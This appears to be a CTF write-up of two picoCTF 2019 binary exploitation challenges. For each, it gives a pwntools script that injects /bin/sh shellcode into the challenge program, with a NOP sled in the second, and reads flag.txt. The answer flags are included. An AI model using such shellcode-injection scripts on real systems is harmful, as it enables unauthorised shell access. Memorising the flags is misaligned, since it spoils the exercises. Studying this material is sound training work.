# PICO CTF (2019)<a name="picoctf19"></a>

***

| Problem | Category | Points |
| ------- | -------- | ------ | 
| [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | 
| [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 |

***

## HANDY SHELLCODE <a name="handyshellcode"></a>

> ### Problem 
>> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server.
>
> ### Solution
>>
~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6')

shellcode = asm(shellcraft.sh())

payload = shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()

~~~

**FLAG:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*

***

## SLIPPERY SHELLCODE <a name="slipperyshellcode"></a>

> ### Problem 
>> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server.
>
> ### Solution
>>
~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1')

padding = '\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()
~~~

**FLAG:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*

***
